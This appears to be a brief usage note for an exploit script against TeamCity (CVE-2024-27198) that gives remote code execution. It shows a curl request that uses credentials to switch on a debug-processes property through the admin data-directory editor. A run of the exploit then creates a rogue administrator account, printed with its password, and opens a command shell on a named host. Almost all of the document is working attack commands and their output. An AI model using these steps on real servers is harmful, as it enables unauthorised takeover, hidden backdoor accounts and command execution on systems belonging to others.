# TeamCity - CVE-2024-27198-RCE

## If the error display

```
command > ls
[-] Match failed. Response text:
Responding with error, status code: 400 (Bad Request).
Details: rest.debug.processes.enable internal property not set
```

## Enable debug.processes.enable=true

```bash
curl -X POST "http://teams.onlyrands.com/admin/dataDir.html?action=edit&fileName=config/internal.properties&content=rest.debug.processes.enable=true" \
--user "ak7hx7e4:avgWVJxnaZ"
```

After enabling then runs well.

```bash
python3 CVE-2024-27198-RCE.py -t http://teams.onlyrands.com

[+] User added successfully, username: 9toqrmxc, password: LCduJ3OyL9, user ID: 30
[+] The target operating system version is linux
command > id
uid=1015(git) gid=1005(git) groups=1005(git)
```
